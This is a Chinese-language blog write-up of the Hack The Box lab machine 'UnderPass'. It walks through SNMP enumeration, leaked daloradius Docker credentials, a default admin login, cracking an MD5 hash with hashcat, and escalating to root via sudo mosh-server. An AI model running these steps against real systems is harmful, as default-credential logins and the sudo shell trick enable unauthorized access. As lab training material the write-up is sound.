<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Easy L-UnderPass-S6 | X1NRI&#39;s trash</title>
  <meta name="author" content="X1NRI">
  
  <meta name="description" content="信息搜集访问ip，是apache2的默认页面
扫端口PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
25/tcp  open  tcpwrapped
|_smtp-commands: Couldn&#39;t establish connection on port 25
80/tcp  open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
110/tcp open  pop3?


扫目录[16:29:27] Starting: 
[16:29:43] 403 -  276B  - /.ht_wsr.txt                                      
[16:29:43] 403 -  276B  - /.htaccess.bak1                                   
[16:29:43] 403 -  276B  - /.htaccess.orig                                   
[16:29:43] 403 -  276B  - /.htaccess.sample
[16:29:43] 403 -  276B  - /.htaccess.save                                   
[16:29:43] 403 -  276B  - /.htaccess_extra                                  
[16:29:43] 403 -  276B  - /.htaccessBAK
[16:29:43] 403 -  276B  - /.htaccess_sc
[16:29:43] 403 -  276B  - /.htaccessOLD
[16:29:43] 403 -  276B  - /.htaccess_orig
[16:29:43] 403 -  276B  - /.htaccessOLD2                                    
[16:29:43] 403 -  276B  - /.htm                                             
[16:29:43] 403 -  276B  - /.html
[16:29:43] 403 -  276B  - /.httr-oauth                                      
[16:29:43] 403 -  276B  - /.htpasswd_test
[16:29:43] 403 -  276B  - /.htpasswds                                       
[16:29:48] 403 -  276B  - /.php                                             
[16:31:51] 403 -  276B  - /server-status                                    
[16:31:51] 403 -  276B  - /server-status/                                   
                                                                             
Task Completed


打波poc什么都没扫出来，但是我注意到一个奇怪的端口 161
入侵研究-SNMP服务"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Easy L-UnderPass-S6"/>
  <meta property="og:site_name" content="X1NRI&#39;s trash"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/links" title="Subscribe me.">
			  <i class="fa fa-chain"></i>Links
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Easy L-UnderPass-S6</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>访问ip，是apache2的默认页面<br><img src="/Rxi134_FILE/2b87e76b5afca44b1a99a18b3db11457_MD5.jpeg"></p>
<h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
25/tcp  open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
110/tcp open  pop3?
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[16:29:27] Starting: 
[16:29:43] 403 -  276B  - /.ht_wsr.txt                                      
[16:29:43] 403 -  276B  - /.htaccess.bak1                                   
[16:29:43] 403 -  276B  - /.htaccess.orig                                   
[16:29:43] 403 -  276B  - /.htaccess.sample
[16:29:43] 403 -  276B  - /.htaccess.save                                   
[16:29:43] 403 -  276B  - /.htaccess_extra                                  
[16:29:43] 403 -  276B  - /.htaccessBAK
[16:29:43] 403 -  276B  - /.htaccess_sc
[16:29:43] 403 -  276B  - /.htaccessOLD
[16:29:43] 403 -  276B  - /.htaccess_orig
[16:29:43] 403 -  276B  - /.htaccessOLD2                                    
[16:29:43] 403 -  276B  - /.htm                                             
[16:29:43] 403 -  276B  - /.html
[16:29:43] 403 -  276B  - /.httr-oauth                                      
[16:29:43] 403 -  276B  - /.htpasswd_test
[16:29:43] 403 -  276B  - /.htpasswds                                       
[16:29:48] 403 -  276B  - /.php                                             
[16:31:51] 403 -  276B  - /server-status                                    
[16:31:51] 403 -  276B  - /server-status/                                   
                                                                             
Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="打波poc"><a href="#打波poc" class="headerlink" title="打波poc"></a>打波poc</h2><p>什么都没扫出来，但是我注意到一个奇怪的端口 161<br><img src="/Rxi134_FILE/698fd9e25e04af140c63e7e9a80e55a1_MD5.jpeg"></p>
<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="研究-SNMP服务"><a href="#研究-SNMP服务" class="headerlink" title="研究-SNMP服务"></a>研究-SNMP服务</h2><p>这里不赘述</p>
<h2 id="SNMP-TCP-161-服务渗透"><a href="#SNMP-TCP-161-服务渗透" class="headerlink" title="SNMP-TCP 161 服务渗透"></a>SNMP-TCP 161 服务渗透</h2><p>存在默认密码 public<br><img src="/Rxi134_FILE/cfe8bd36b38ba6002436f162b0d2f414_MD5.jpeg"></p>
<p>枚举信息<br><img src="/Rxi134_FILE/6875177ec2bcb0990ae4bfb400eb368f_MD5.jpeg"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Host IP                       : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 17:27:15.63
Uptime system                 : 17:27:05.40
System date                   : 2025-1-8 03:54:43.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="daloradius"><a href="#daloradius" class="headerlink" title="daloradius"></a>daloradius</h2><p>daloradius 是什么东西，上网看看<br><img src="/Rxi134_FILE/1d7aa0a2744b35ce001afd6ed5b0d931_MD5.jpeg"></p>
<p>这么说目录还有 &#x2F;daloradius ？<br><img src="/Rxi134_FILE/6bb08896997bf339e96d13d7e3b35cc6_MD5.jpeg"></p>
<p>访问<code>http://10.10.11.48/daloradius/</code>回显403！这说明目录下是有东西的哇<br><img src="/Rxi134_FILE/f4fb0e26f17ce7b164b61b55f316ef02_MD5.jpeg"></p>
<h3 id="扫目录1"><a href="#扫目录1" class="headerlink" title="扫目录1"></a>扫目录1</h3><p>再扫一波目录<br><img src="/Rxi134_FILE/a22be685ff4d13ce6eec54be9d7f3df4_MD5.jpeg"></p>
<p>有docker文件的泄露</p>
<ul>
<li><code>docker-compose.yml</code> 下有些密码信息：<pre class="line-numbers language-text" data-language="text"><code class="language-text">version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p>但是怎么没见到 daloradius 的登录界面</p>
<ul>
<li>Dockerfile<pre class="line-numbers language-text" data-language="text"><code class="language-text"># Official daloRADIUS Dockerfile
# GitHub: https://github.com/lirantal/daloradius
#
# Build image:
# 1. git pull git@github.com:lirantal/daloradius.git
# 2. docker build . -t lirantal/daloradius
#
# Run the container:
# 1. docker run -p 80:80 -p 8000:8000 -d lirantal/daloradius

FROM debian:11-slim
MAINTAINER Liran Tal &lt;liran.tal@gmail.com>

LABEL Description="daloRADIUS Official Docker based on Debian 11 and PHP7." \
	License="GPLv2" \
	Usage="docker build . -t lirantal/daloradius &amp;&amp; docker run -d -p 80:80 -p 8000:8000 lirantal/daloradius" \
	Version="2.0beta"

ENV DEBIAN_FRONTEND noninteractive

# default timezone
ENV TZ Europe/Vienna

# PHP install
RUN apt-get update \
  &amp;&amp; apt-get install --yes --no-install-recommends \
  ca-certificates \
  apt-utils \
  freeradius-utils \
  tzdata \
  apache2 \
  libapache2-mod-php \
  cron \
  net-tools \
  php \
  php-common \
  php-gd \
  php-cli \
  php-curl \
  php-mail \
  php-dev \
  php-mail-mime \
  php-mbstring \
  php-db \
  php-mysql \
  php-zip \
  mariadb-client \
  default-libmysqlclient-dev \
  unzip \
  wget \
  &amp;&amp; rm -rf /var/lib/apt/lists/*

ADD contrib/docker/operators.conf /etc/apache2/sites-available/operators.conf
ADD contrib/docker/users.conf /etc/apache2/sites-available/users.conf
RUN a2dissite 000-default.conf &amp;&amp; \
    a2ensite users.conf operators.conf &amp;&amp; \
    sed -i 's/Listen 80/Listen 80\nListen 8000/' /etc/apache2/ports.conf

# Create directories
# /data should be mounted as volume to avoid recreation of database entries
RUN mkdir /data
ADD . /var/www/daloradius

#RUN touch /var/www/html/library/daloradius.conf.php
RUN chown -R www-data:www-data /var/www/daloradius

# Remove the original sample web folder
RUN rm -rf /var/www/html
#
# Create daloRADIUS Log file
RUN touch /tmp/daloradius.log &amp;&amp; chown -R www-data:www-data /tmp/daloradius.log
RUN mkdir -p /var/log/apache2/daloradius &amp;&amp; chown -R www-data:www-data /var/log/apache2/daloradius
RUN echo "Mutex posixsem" >> /etc/apache2/apache2.conf

## Expose Web port for daloRADIUS
EXPOSE 80
EXPOSE 8000
#
## Run the script which executes Apache2 in the foreground as a running process
CMD ["/bin/bash", "/var/www/daloradius/init.sh"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h2 id="尝试密码重用（失败）"><a href="#尝试密码重用（失败）" class="headerlink" title="尝试密码重用（失败）"></a>尝试密码重用（失败）</h2><p>ssh密码，碰碰运气，用户名 steve</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">radius
radiusdbpw
radiusrootdbpw
testing123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="扫目录2（成功，确定登录点）"><a href="#扫目录2（成功，确定登录点）" class="headerlink" title="扫目录2（成功，确定登录点）"></a>扫目录2（成功，确定登录点）</h2><p>前面有几个目录是301：app&#x2F;、library&#x2F;、setup&#x2F;、doc&#x2F;，对着app&#x2F;再扫一波，扫到了！<br><img src="/Rxi134_FILE/d53edf6045f669d64b94aaacdb323346_MD5.jpeg"></p>
<p><code>http://underpass.htb/daloradius/app/users/login.php</code><br><img src="/Rxi134_FILE/ca66a12070b877ffe18e9972cf567700_MD5.jpeg"></p>
<h2 id="弱口令登录"><a href="#弱口令登录" class="headerlink" title="弱口令登录"></a>弱口令登录</h2><h3 id="默认密码登录（失败）"><a href="#默认密码登录（失败）" class="headerlink" title="默认密码登录（失败）"></a>默认密码登录（失败）</h3><p>尝试默认密码</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator/radius<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="弱口令爆破（失败）"><a href="#弱口令爆破（失败）" class="headerlink" title="弱口令爆破（失败）"></a>弱口令爆破（失败）</h3><p>我们现在已知：</p>
<ul>
<li>联系人<pre class="line-numbers language-text" data-language="text"><code class="language-text">steve@underpass.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>密码<pre class="line-numbers language-text" data-language="text"><code class="language-text">radius
radiusdbpw
radiusrootdbpw
testing123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h2 id="寻找新攻击面"><a href="#寻找新攻击面" class="headerlink" title="寻找新攻击面"></a>寻找新攻击面</h2><h3 id="新入口"><a href="#新入口" class="headerlink" title="新入口"></a>新入口</h3><p>无果，到网上找下源码看看有没有其它信息</p>
<blockquote>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/lirantal/daloradius/">daloradius&#x2F;app at master · lirantal&#x2F;daloradius</a></p>
</blockquote>
<p>突然发现网站还有一个目录 operators&#x2F;，并且下面也有login.php，有没有可能是另一个登录入口？<br><img src="/Rxi134_FILE/a403fdc548a8943f4add5be4aea28e4f_MD5.jpeg"></p>
<h3 id="默认密码登录（成功）"><a href="#默认密码登录（成功）" class="headerlink" title="默认密码登录（成功）"></a>默认密码登录（成功）</h3><p><code>http://underpass.htb/daloradius/app/operators/login.php</code><br><img src="/Rxi134_FILE/10dea5fb7ac730182d25edc017b09d0e_MD5.jpeg"></p>
<p>尝试默认密码</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator/radius<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功进入后台！<br><img src="/Rxi134_FILE/253a0627051323e1c585800cf95390fe_MD5.jpeg"></p>
<h3 id="发现新用户"><a href="#发现新用户" class="headerlink" title="发现新用户"></a>发现新用户</h3><p>翻找有没有可用的信息，发现有一个用户 svcMosh<br><img src="/Rxi134_FILE/396945461bfc890002ef999357d745dd_MD5.jpeg"></p>
<p>密码md5为：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">412DD4759978ACFCC81DEAB01B382403<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="爆破密码hash"><a href="#爆破密码hash" class="headerlink" title="爆破密码hash"></a>爆破密码hash</h3><p>使用 rockyou 的字典</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token string">"412DD4759978ACFCC81DEAB01B382403"</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>wordlists<span class="token punctuation">\</span>rockyou<span class="token punctuation">\</span>rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/0b63e41cefc7a39ad320b1dac3ecbeb8_MD5.jpeg"><br>还真爆出来了</p>
<p>现在我们有了一组可能的凭据</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">svcMosh:underwaterfriends<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="尝试ssh登录（成功）"><a href="#尝试ssh登录（成功）" class="headerlink" title="尝试ssh登录（成功）"></a>尝试ssh登录（成功）</h4><p>ssh直接能够登录！<br><img src="/Rxi134_FILE/3aff54eeea5edc4dee038adc5904e683_MD5.jpeg"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><p><img src="/Rxi134_FILE/4881bb1eb7ca8af99b36e8f3f27bdba3_MD5.jpeg"></p>
<h3 id="mosh-server"><a href="#mosh-server" class="headerlink" title="mosh-server"></a>mosh-server</h3><blockquote>
<p>Mosh表示移动Shell(Mobile Shell)，是一个用于从客户端跨互联网连接远程服务器的命令行工具。它能用于SSH连接，但是比Secure Shell功能更多。它是一个类似于SSH而带有更多功能的应用。程序最初由Keith Winstein 编写，用于类Unix的操作系统中，发布于GNU GPL V3协议下。<br>Mosh最大的特点是基于UDP方式传输，支持在服务端创建一个临时的Key供客户端一次性连接，退出后失效；也支持通过SSH的配置进行认证，但数据传输本身还是自身的UDP方式。</p>
</blockquote>
<h4 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h4><p>查看帮助</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: mosh-server new <span class="token punctuation">[</span>-s<span class="token punctuation">]</span> <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i LOCALADDR<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PORT<span class="token punctuation">[</span>:PORT2<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>-c COLORS<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l <span class="token assign-left variable">NAME</span><span class="token operator">=</span>VALUE<span class="token punctuation">]</span> <span class="token punctuation">[</span>-- COMMAND<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>有一个有趣的参数：<br><img src="/Rxi134_FILE/bd63058a6a78461573f008032fac87e5_MD5.jpeg"></p>
<p>安装mosh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mosh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在Server端：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">svcMosh@underpass:~$ <span class="token function">sudo</span> mosh-server -- /bin/bash


MOSH CONNECT <span class="token number">60001</span> U2zSkBl45bNNtkgP50q7qQ

mosh-server <span class="token punctuation">(</span>mosh <span class="token number">1.3</span>.2<span class="token punctuation">)</span> <span class="token punctuation">[</span>build mosh <span class="token number">1.3</span>.2<span class="token punctuation">]</span>
Copyright <span class="token number">2012</span> Keith Winstein <span class="token operator">&lt;</span>mosh-devel@mit.edu<span class="token operator">></span>
License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>.
This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

<span class="token punctuation">[</span>mosh-server detached, pid <span class="token operator">=</span> <span class="token number">19180</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这相当于是一个临时登录，开放 UDP 60001端口接收客户端的连接，密钥为 U2zSkBl45bNNtkgP50q7qQ<br><img src="/Rxi134_FILE/19e3e3f6572b14436cedf9629ed0a6d6_MD5.jpeg"><br>成功开放</p>
<p>在Client端：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MOSH_KEY</span><span class="token operator">=</span>U2zSkBl45bNNtkgP50q7qQ
$ mosh-client <span class="token number">10.10</span>.11.48 <span class="token number">65001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/be0dae41a6f0d2cef2289beb9a2e16ff_MD5.jpeg"><br>提权成功！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>外网打了好几天才进去，还是太菜了</p>
<ul>
<li>snmp协议信息泄露很新颖，学习了</li>
</ul>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2025/01/13/9.%20Easy%20L-UnderPass-S6%E6%8E%92%E4%BD%8D%E8%B5%9B/" class="leancloud-visitors view" data-flag-title="Easy L-UnderPass-S6">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2025/01/12/2025-01第三周：2022春秋杯 chunzhiIOT/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2025-01-13 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/pentest/">pentest<span>13</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/靶场/">靶场<span>8</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-article-text">扫端口</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="toc-article-text">扫目录</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%93%E6%B3%A2poc"><span class="toc-article-text">打波poc</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%A0%94%E7%A9%B6-SNMP%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">研究-SNMP服务</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SNMP-TCP-161-%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F"><span class="toc-article-text">SNMP-TCP 161 服务渗透</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#daloradius"><span class="toc-article-text">daloradius</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%951"><span class="toc-article-text">扫目录1</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E5%AF%86%E7%A0%81%E9%87%8D%E7%94%A8%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">尝试密码重用（失败）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%952%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%8C%E7%A1%AE%E5%AE%9A%E7%99%BB%E5%BD%95%E7%82%B9%EF%BC%89"><span 